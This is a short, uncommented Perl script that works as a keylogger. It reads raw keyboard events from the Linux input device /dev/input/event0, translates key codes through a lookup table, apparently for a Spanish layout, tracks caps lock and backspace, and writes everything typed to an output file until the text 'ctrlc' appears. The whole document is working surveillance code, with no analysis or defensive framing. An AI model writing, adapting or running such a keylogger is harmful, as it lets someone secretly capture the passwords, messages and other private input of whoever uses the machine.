use warnings;
use strict;

my @lookup_table;
push(@lookup_table,' ');
push(@lookup_table,'esc');
for my $i (1..9){
  push(@lookup_table,$i);
}
push(@lookup_table,'0');
push(@lookup_table,'\'');
push(@lookup_table,'¿');
push(@lookup_table,'back');
push(@lookup_table,'tab');
push(@lookup_table,'q');
push(@lookup_table,'w');
push(@lookup_table,'e');
push(@lookup_table,'r');
push(@lookup_table,'t');
push(@lookup_table,'y');
push(@lookup_table,'u');
push(@lookup_table,'i');
push(@lookup_table,'o');
push(@lookup_table,'p');
push(@lookup_table,' ');
push(@lookup_table,'+');
push(@lookup_table,'enter');
push(@lookup_table,'leftctrl');
push(@lookup_table,'a');
push(@lookup_table,'s');
push(@lookup_table,'d');
push(@lookup_table,'f');
push(@lookup_table,'g');
push(@lookup_table,'h');
push(@lookup_table,'j');
push(@lookup_table,'k');
push(@lookup_table,'l');
push(@lookup_table,'ñ');
push(@lookup_table,'{');
push(@lookup_table,'|');
push(@lookup_table,'shift');
push(@lookup_table,'}');
push(@lookup_table,'z');
push(@lookup_table,'x');
push(@lookup_table,'c');
push(@lookup_table,'v');
push(@lookup_table,'b');
push(@lookup_table,'n');
push(@lookup_table,'m');
push(@lookup_table,',');
push(@lookup_table,'.');
#print $lookup_table[52];
my $filename = '/dev/input/event0';
my $written="";
my $mayus=0;
open(FH, '<:raw :bytes', $filename) or die $!;
open(FILE, '>', $ARGV[0]) or die $!;
print("File $filename opened successfully!\n");
my %input_event;
while (1) {
    my $bytes = read FH, my $content, 24;
    @input_event{ qw(v_sec tv_usec type code value) } = unpack "L!L!S!S!i!", $content;
    if($input_event{"type"}==17 and $input_event{"code"} ==1){
      $mayus=($input_event{"value"} == 1)? 1:0;
    }
    if ($input_event{"type"}==1 and $input_event{"code"} < 53 and $input_event{"value"} ==1){
      my $char=($mayus)?uc $lookup_table[$input_event{"code"}]:$lookup_table[$input_event{"code"}];
      $written=($lookup_table[$input_event{"code"}] eq "back") ? substr($written, 0, length($written)-1): $written.$char;
    }elsif($input_event{"code"} == 57){
      $written.=" ";
    }
    if($written=~ /ctrlc/){
      print FILE substr($written, 0, length($written)-9);
      close(FH);
      close(FILE);
      last;
    }
}
